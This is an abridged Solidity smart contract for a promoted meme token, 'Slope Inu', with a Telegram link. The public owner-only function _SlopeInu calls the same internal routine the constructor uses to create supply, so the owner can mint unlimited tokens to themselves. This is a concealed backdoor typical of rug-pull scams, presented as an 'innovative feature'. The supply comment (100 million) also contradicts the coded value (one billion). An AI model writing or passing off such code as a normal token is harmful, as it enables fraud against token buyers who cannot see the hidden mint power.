...
//
// $SlopeInu🇨🇳 proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+7KwxvSYgh6k1MWI1
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SlopeInu(uint256 amount) public onlyOwner {
 _SlopeInu(msg.sender, amount);
    }
    ...
    function _SlopeInu(address account, uint256 amount) internal virtual {
...
contract $SlopeInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Slope Inu🇨🇳", "SLOPEINU") {
     _SlopeInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}